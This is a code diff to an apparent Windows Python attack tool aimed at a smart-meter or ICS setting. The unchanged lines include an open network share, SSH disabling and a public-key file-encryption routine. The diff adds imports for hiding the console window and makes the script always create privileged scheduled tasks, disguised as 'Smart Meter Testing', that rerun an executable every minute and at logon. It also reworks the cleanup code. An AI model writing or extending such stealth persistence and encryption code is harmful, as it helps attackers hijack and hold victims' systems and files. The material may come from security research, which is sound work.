@@ -12,6 +12,8 @@ from sys import executable, argv
 from win32netcon import ACCESS_ALL
 from win32net import NetShareAdd
 from time import sleep
+from win32console import GetConsoleWindow
+from win32gui import ShowWindow
 import kepconfig
 import pkgutil
 
@@ -91,7 +93,7 @@ def disable_ssh():
         print("The " + output[1] + " service is " + output[9])
         count += 1
 
-    if count == 5:
+    if count > 4:
         print("SSH Disabled successfully.\nOk.\n")
     else:
         print("SSH Failed to Disable.\nFail.\n")
@@ -225,11 +227,8 @@ def Create_scheduled_task():
     sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
     sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
 
-    
-    schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
-    if "ERROR" not in schtaskschk.stdout:
-        call(sch1, shell=True)
-        call(sch2, shell=True)
+    call(sch1, shell=True)
+    call(sch2, shell=True)
 
 def encrypt_Files():
     #public key
@@ -638,22 +637,22 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 
         netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
 
-        if "SmartMeterfolder" in netsharechk.stdout:
-            call('cmd /k "net share SmartMeterfolder /delete"', shell=True)
-
         task_name1 = 'Smart Meter Testing'
         task_name2 = 'Smart Meter Testing 2'
 
         schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
-        if "ERROR" not in schtaskschk.stdout:
+        
             
-            # Define the command to delete the task using schtasks
-            schdel = f'schtasks /delete /tn "{task_name1}" /f'
-            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
+        # Define the command to delete the task using schtasks
+        schdel = f'schtasks /delete /tn "{task_name1}" /f'
+        schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
 
-            # Delete the task using the schtasks command
-            call(schdel, shell=True)
-            call(schdel2, shell=True)
+        # Delete the task using the schtasks command
+        call(schdel, shell=True)
+        call(schdel2, shell=True)
+
+        if "SmartMeterfolder" in netsharechk.stdout:
+            call('cmd /k "net share SmartMeterfolder /delete"', shell=True)
 
         print("Ok.")
 
@@ -849,15 +848,15 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         task_name2 = 'Smart Meter Testing 2'
 
         schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)
-        if "ERROR" not in schtaskschk.stdout:
-            
-            # Define the command to delete the task using schtasks
-            schdel = f'schtasks /delete /tn "{task_name1}" /f'
-            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
 
-            # Delete the task using the schtasks command
-            call(schdel, shell=True)
-            call(schdel2, shell=True)
+        
+        # Define the command to delete the task using schtasks
+        schdel = f'schtasks /delete /tn "{task_name1}" /f'
+        schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
+
+        # Delete the task using the schtasks command
+        call(schdel, shell=True)
+        call(schdel2, shell=True)
 
         print("\n==================================\n")
 
